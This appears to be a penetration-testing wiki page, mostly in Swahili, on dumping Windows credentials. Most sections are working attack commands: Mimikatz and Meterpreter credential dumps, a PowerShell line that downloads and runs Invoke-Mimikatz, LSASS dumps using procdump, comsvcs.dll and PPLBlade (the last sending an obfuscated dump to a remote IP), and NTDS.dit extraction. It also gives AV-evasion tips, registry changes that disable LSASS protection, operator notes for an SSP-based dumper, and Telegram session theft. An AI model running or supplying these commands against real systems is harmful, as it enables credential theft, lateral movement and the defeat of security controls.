# Kuiba Vitambulisho vya Windows

{{#include ../../banners/hacktricks-training.md}}

## Vitambulisho vya Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Tafuta mambo mengine ambayo Mimikatz inaweza kufanya kwenye** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Jifunze kuhusu baadhi ya ulinzi unaowezekana wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials kwa Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **niliyoitengeneza** kutafuta **passwords na hashes** ndani ya mashine ya mwathiriwa.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Kukwepa AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, haigunduliwi na Defender.\
Unaweza kutumia zana hii **kufanya dump ya mchakato wa lsass**, **kupakua dump** na **kutoa** **credentials kwenye kompyuta ya ndani** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe ili kufanya dump ya lsass.exe** kama **hasidi**. Hii ni kwa sababu **zinatambua** mifuatano **"procdump.exe" na "lsass.exe"**. Kwa hiyo, ni **stealthier** zaidi **kupitisha** **PID** ya lsass.exe kwa procdump kama **argument**, **badala ya** jina **lsass.exe.**

### Kufanya dump ya lsass kwa kutumia **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana katika `C:\Windows\System32`, inawajibika kwa **kufanya dump ya kumbukumbu ya mchakato** iwapo kutatokea crash. DLL hii inajumuisha **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Haijalishi kutumia arguments mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. PID ya mchakato wa kufanyiwa dump ni kipengele cha kwanza, eneo la faili ya dump ni cha pili, na kipengele cha tatu lazima kiwe neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchanganua vipengele hivi vitatu, DLL huanza kuunda faili ya dump na kuhamisha kumbukumbu ya mchakato uliobainishwa ndani ya faili hiyo.\
Inawezekana kutumia **comsvcs.dll** kufanya dump ya mchakato wa lsass, hivyo kuondoa hitaji la kupakia na kutekeleza procdump. Mbinu hii imefafanuliwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Amri ifuatayo hutumika kutekeleza:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Unaweza kuotomatisha mchakato huu kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kutupa lsass kwa kutumia Task Manager**

1. Bofya kulia kwenye Task Bar kisha ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato wa "Local Security Authority Process" kisha ubofye "Create dump file".

### Kutupa lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft na ni sehemu ya mkusanyiko wa [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Crash dump ya mfumo mzima iliyokuwepo tayari, au nakala iliyobanwa kwenye folda ya mtumiaji inayoweza kufikiwa, inaweza kuhifadhi taarifa za credentials kwa ajili ya uchanganuzi wa offline. Majina ya faili kama `MEMORY.DMP` na `MEMORY.7z` ni vidokezo vya kuanzisha ukaguzi tu: thibitisha chanzo na ufikiaji wake, na usidhani kuwa zina credentials zinazoweza kutumika au zilizo za sasa.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Utoaji wa credentials nje ya mtandao kutoka kwa snapshots za VM

Backup ya VM inayosomeka inaweza kuwa na **picha iliyohifadhiwa ya kumbukumbu ya guest**, hata bila ufikiaji wa guest inayoendesha au LSASS. Kwa VMware, tambua metadata ya snapshot ya `.vmsn` na `.vmem` yake inayoandamana nayo ikiwa ipo; usichanganye mojawapo na picha ya diski ya `.vmdk`. `VMkatz` huchanganua ingizo la snapshot au saraka ya VM na inaweza kurejesha [credentials za Windows logon-session](credentials-mimikatz.md), kama vile hashes na tickets, kutoka kwenye kumbukumbu ya guest. Pia inaweza kukagua diski pepe kutafuta nyenzo za SAM/LSA. Ufikiaji wa faili za backup ndio sharti, si haki za debug kwenye VM inayotumika.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Mfano katika Checkpoint ulipata NT hash ya Administrator **ya ndani** kutoka kwenye snapshot ya VM inayojitegemea. Hash hiyo iliweza kuthibitisha utambulisho kwenye domain baada tu ya kuthibitisha kando kuwa nenosiri lilitumika tena; hash ya ndani kutoka kwenye backup si credential ya domain moja kwa moja. Kwenye host yenye kumbukumbu finyu, VMkatz inaweza kuchanganua na kuachilia kurasa za kumbukumbu hatua kwa hatua, lakini kunakili snapshot hadi kwenye host kubwa zaidi ya uchanganuzi bado kunaweza kuwa bora.<sup>[[17]](#references)[[18]](#references)</sup>

## Kudump lsass kwa kutumia PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni zana ya kudump Protected Process inayoweza kuficha dump ya kumbukumbu na kuihamisha kwenye workstation za mbali bila kuiandika kwenye diski.

**Utendaji muhimu**:

1. Kukwepa ulinzi wa PPL
2. Kuficha faili za dump ya kumbukumbu ili kukwepa mifumo ya Defender ya ugunduzi inayotegemea signatures
3. Kupakia dump ya kumbukumbu kwa kutumia mbinu za upakiaji za RAW na SMB bila kuiandika kwenye diski (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Udumping wa LSASS unaotegemea SSP bila MiniDumpWriteDump

Ink Dragon husambaza dumper ya hatua tatu iitwayo **LalsDumper**, ambayo haiiti kamwe `MiniDumpWriteDump`, kwa hivyo EDR hooks kwenye API hiyo hazijawahi kuwashwa:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – hutafuta placeholder yenye herufi 32 ndogo za `d` ndani ya `fdp.dll`, huiandika upya kwa kutumia absolute path ya `rtu.txt`, huhifadhi DLL iliyorekebishwa kama `nfdp.dll`, kisha huita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Stage 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hufanya XOR kwa kila byte kwa kutumia `0x20`, na kupangilia blob iliyodekodishwa kwenye memory kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyopangiliwa upya hutekeleza logic ya MiniDump kwa kutumia **direct syscalls** zilizotatuliwa kutoka kwa majina ya API yaliyohashishwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, hutiririsha dump iliyobanwa ya LSASS kwenye faili, na kufunga handle ili exfiltration iweze kufanyika baadaye.

Maelezo ya operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory moja. Stage 1 huandika upya placeholder iliyowekwa kwa hard-code kwa kutumia absolute path ya `rtu.txt`, kwa hivyo kuzigawa huvunja chain.
* Usajili hufanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS ipakie upya SSP kila boot.
* Faili za `%TEMP%\*.ddt` ni dumps zilizobanwa. Zibandue kwenye kifaa cha ndani, kisha uzitumie kwenye Mimikatz/Volatility kwa ajili ya uchimbaji wa credentials.
* Kuendesha `lals.exe` kunahitaji admin/SeTcb rights ili `AddSecurityPackageA` ifanikiwe; simu hiyo ikisharejesha matokeo, LSASS hupakia SSP hasidi na kutekeleza Stage 2 bila kuonekana.
* Kuondoa DLL kwenye diski hakuiondoi kutoka LSASS. Futa ingizo la registry na uwashe upya LSASS (reboot), au uiache kwa persistence ya muda mrefu.

## CrackMapExec

### Dump hashes za SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump siri za LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump faili ya NTDS.dit kutoka kwa DC lengwa

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historia ya nywila ya NTDS.dit kutoka kwa DC lengwa

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Kuiba SAM na SYSTEM

Faili hizi zinapaswa **kupatikana** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zimelindwa.

### Kutoka kwenye Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwenye Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pakua** faili hizo kwenye mashine yako ya Kali na **utoe hashes** kwa kutumia:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

Kwa utaratibu tofauti unaotumia snapshots ambazo tayari zimefichuliwa kwenye network share inayoweza kusomeka, angalia [SMB Previous Versions](../../network-services-pentesting/pentesting-smb/#read-previous-versions-exposed-by-a-share).

#### Using vssadmin

Binary ya vssadmin inapatikana tu katika matoleo ya Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili la SAM** (kiendeshi kilichotumika ni "C:" na limehifadhiwa kwenye C:\users\Public), lakini unaweza kutumia njia hii kunakili faili lolote lililolindwa:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Msimbo kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kunakili SAM, SYSTEM na ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Vitambulisho vya Active Directory - NTDS.dit**

Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likihifadhi data muhimu kuhusu objects za watumiaji, vikundi na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain huhifadhiwa. Faili hili ni database ya **Extensible Storage Engine (ESE)** na liko kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Database hii ina majedwali matatu makuu:

- **Data Table**: Jedwali hili huhifadhi maelezo kuhusu objects kama watumiaji na vikundi.
- **Link Table**: Hufuatilia mahusiano, kama vile uanachama wa vikundi.
- **SD Table**: **Security descriptors** za kila object huhifadhiwa hapa, zikihakikisha usalama na udhibiti wa ufikiaji wa objects zilizohifadhiwa.

Utafiti wa Christoffer Andersson kuhusu tabaka la database unaeleza majedwali haya na tabia zake kulingana na toleo kwa undani zaidi.<sup>[[8]](#references)</sup>

Windows hutumia _Ntdsa.dll_ kuingiliana na faili hilo, na hutumiwa na _lsass.exe_. Kisha, **sehemu** ya faili la **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (huenda ukapata data iliyofikiwa hivi karibuni kutokana na uboreshaji wa utendaji unaotumia **cache**).

#### Kusimbua hashes zilizo ndani ya NTDS.dit

Hash husimbwa mara tatu:

1. Simbua Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Simbua **hash** kwa kutumia **PEK** na **RC4**.
3. Simbua **hash** kwa kutumia **DES**.

**PEK** ina **thamani ileile kwenye kila domain controller**, lakini **husimbwa** ndani ya **NTDS.dit** kwa kutumia **BOOTKEY** maalum ya DC kutoka kwenye hive ya **SYSTEM** ya domain controller hiyo. Kwa hivyo, kutoa credentials kunahitaji faili zote mbili: **NTDS.dit** na **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Mbinu tofauti ya [kernel handle-table redirection](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) inaweza kunakili NTDS file object ambayo tayari imefunguliwa bila kutumia VSS, lakini inahitaji primitive ya kusoma/kuandika kernel kiholela kwenye domain controller.<sup>[[16]](#references)</sup>

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **faili ya SYSTEM** (tena, tumia mbinu ya [**kuidump kutoka kwenye registry au kutumia volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili za **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ ili **kutoa hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Unaweza pia **kuzitoa kiotomatiki** kwa kutumia mtumiaji halali wa msimamizi wa domain:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Kwa **faili kubwa za NTDS.dit**, inapendekezwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **moduli ya metasploit**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa objekti za domain kutoka NTDS.dit na kuziweka kwenye hifadhidata ya SQLite**

Objekti za NTDS zinaweza kutolewa na kuwekwa kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Si siri pekee zinazotolewa; objekti zote na sifa zake pia hutolewa ili kupata maelezo zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive ya `SYSTEM` ni ya hiari, lakini huruhusu usimbuaji wa secrets (NT & LM hashes, supplemental credentials kama vile cleartext passwords, kerberos au trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data ifuatayo hutolewa: akaunti za watumiaji na mashine pamoja na hashes zao, UAC flags, mihuri ya muda ya kuingia na kubadilisha password mara ya mwisho, maelezo ya akaunti, majina, UPN, SPN, groups na memberships za kujirudia, mti wa organizational units na membership, trusted domains pamoja na aina, mwelekeo na attributes za trusts...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). unaweza kutumia binary hii kutoa credentials kutoka kwenye software mbalimbali.

```
lazagne.exe all
```

## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Ipakue kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa credentials kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Toa taarifa za uthibitishaji kutoka kwenye faili ya SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na **uiendeshe tu**, kisha nywila zitatolewa.

## Kukusanya taarifa kutoka kwa vipindi vya RDP visivyotumika na kudhoofisha vidhibiti vya usalama

FinalDraft RAT ya Ink Dragon inajumuisha tasker ya `DumpRDPHistory` yenye mbinu zinazofaa kwa red-teamer yeyote:<sup>[[3]](#references)</sup>

### Ukusanyaji wa telemetry kwa mtindo wa DumpRDPHistory

* **Malengo ya RDP ya nje** – changanua kila hive ya mtumiaji kwenye `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la seva, `UsernameHint`, na muhuri wa muda wa maandishi ya mwisho. Unaweza kuiga mantiki ya FinalDraft kwa PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ushahidi wa RDP inayoingia** – uliza logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kuhusu Event ID **21** (kuingia kulikofanikiwa) na **25** (kukata muunganisho) ili kubaini ni nani aliyesimamia kompyuta:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Baada ya kujua ni Domain Admin yupi huunganisha mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati session yao **iliyokatwa muunganisho** bado ipo. CredSSP + NTLM fallback huacha verifier na tokens zao kwenye LSASS, ambazo zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Registry downgrades zinazolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha funguo kadhaa za registry ili kurahisisha wizi wa credentials:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` huzima Restricted Admin kwa RDP inayoingia; haiwashi pass-the-hash kupitia hali hiyo. Kuweka thamani kuwa `0` huruhusu Restricted Admin kwenye mashine lengwa, lakini mteja lazima aombe `/RestrictedAdmin` au atumie sera inayohitaji Restricted Admin.<sup>[[14]](#references)</sup> Hash pekee haitoi haki za msimamizi wa mbali; tazama [masharti ya uthibitishaji wa RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa tokeni za UAC ili wasimamizi wa ndani wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` huruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, na hivyo kuwapa washambuliaji akaunti nyingine ya ndani yenye haki za juu.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa kumbukumbu kuwa rahisi sana kwa zana za kutupa kumbukumbu kama LalsDumper.

## Vitambulisho vya usanidi wa hMailServer (baada ya kuathiri mfumo)

Kagua faili halisi za usanidi `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, na `C:\ProgramData\hMailServer\hMailServer.ini` kulingana na mpangilio wa usakinishaji. Thamani inayosomeka na isiyo tupu ya `[Security] AdministratorPassword=` ni hash ya nenosiri la usimamizi wa hMailServer; si ushahidi wa nenosiri la Windows Administrator. Ikiwa kitambulisho hicho kitapatikana, kuhamia kwenye akaunti ya Windows kunahitaji uthibitisho wa kujitegemea wa kutumika tena kwa nenosiri na haki za kuingia.

Kwa usakinishaji unaotumia hifadhidata ya SQL CE, thamani tofauti ya `[Database] Password=` katika INI hulinda hifadhidata. Katika usakinishaji wa zamani, thamani hii husimbwa kwa Blowfish kwa kutumia ufunguo tuli `THIS_KEY_IS_NOT_SECRET` na mabadiliko ya endianness ya maneno ya baiti 4. Tumia mfuatano wa hex kutoka kwenye INI kwa kutumia kipande hiki cha Python:<sup>[[2]](#references)</sup>

Kwanza thibitisha kuwa akaunti ya sasa inaweza kusoma **INI na** hifadhidata inayolingana ya SQL CE `.sdf`. Nenosiri la INI hulinda hifadhidata; ni tofauti na hash za akaunti za mailbox zilizohifadhiwa ndani yake. Kagua au boresha **nakala** ya hifadhidata inayotumika; usiwahi kutumia faili hai.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Kwa kutumia nenosiri la maandishi wazi, nakili hifadhidata ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider ya 32-bit, na uiboreshe ikihitajika kabla ya kuuliza hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Safu wima ya `accountpassword` hutumia umbizo la hMailServer hash (hashcat mode `1421`). Nywila ya mailbox iliyovunjwa huwa njia ya kufanya pivot kwenda kwa mtumiaji wa Windows ikiwa tu nywila hiyo inatumika tena na akaunti ya local/domain na akaunti hiyo ina haki zinazohitajika za kuingia kwa mbali.

## Uingiliaji wa LSA Logon Callback (LsaApLogonUserEx2)

Baadhi ya zana hunasa **nywila za logon zilizo plaintext** kwa kuingilia LSA logon callback `LsaApLogonUserEx2`. Wazo ni kuweka hook au wrapper kwenye callback ya authentication package ili kunasa credentials **wakati wa logon** (kabla ya hashing), kisha kuziandika kwenye diski au kumrudishia operator. Kwa kawaida, hili hutekelezwa kwa kutumia helper inayoingiza msimbo kwenye LSA au kujisajili nayo, kisha kurekodi kila tukio la logon lililofaulu—la interactive/network—pamoja na username, domain na password.<sup>[[1]](#references)</sup>

Maelezo ya kiutendaji:
- Inahitaji local admin/SYSTEM ili kupakia helper kwenye njia ya authentication.
- Credentials zilizonaswa huonekana tu logon inapotokea (interactive, RDP, service, au network logon, kutegemea hook).

## Credentials za Muunganisho Zilizohifadhiwa za SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi taarifa za muunganisho zilizohifadhiwa kwenye faili ya `sqlstudio.bin` ya kila mtumiaji. Zana maalum za dump zinaweza kuchanganua faili hiyo na kurejesha credentials za SQL zilizohifadhiwa. Katika shell zinazorejesha matokeo ya amri pekee, mara nyingi faili hiyo hutolewa kwa kuisimba kama Base64 na kuichapisha kwenye stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Kwa upande wa operator, jenga upya faili na uendeshe dumper kwenye mashine ya ndani ili kurejesha credentials:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Wizi wa session na cookie za kivinjari kupitia Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Wizi wa session ya `tdata` ya Telegram Desktop

Telegram Desktop huhifadhi hali ya uidhinishaji na akaunti katika saraka yake ya **`tdata`**. Session iliyonakiliwa inaweza kupakiwa kwa kutumia zana zinazooana ili kuthibitisha akaunti bila nenosiri, mradi tu uidhinishaji huo bado ni halali; usimbaji fiche wa data ya ndani ukiwa umewashwa, mwizi pia atahitaji passcode yake. Session iliyoidhinishwa inaweza kufichua data ya utambulisho, metadata ya mazungumzo na uanachama, ujumbe na media zinazoweza kupakuliwa.<sup>[[10]](#references)</sup>

### Ugunduzi na upatikanaji

Tafuta katika miundo ya usakinishaji na portable; majina ya vifurushi vya Microsoft Store hutofautiana, kwa hivyo orodhesha saraka za vifurushi zilizo na `TelegramMessenge` na ukague mti wake wa `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

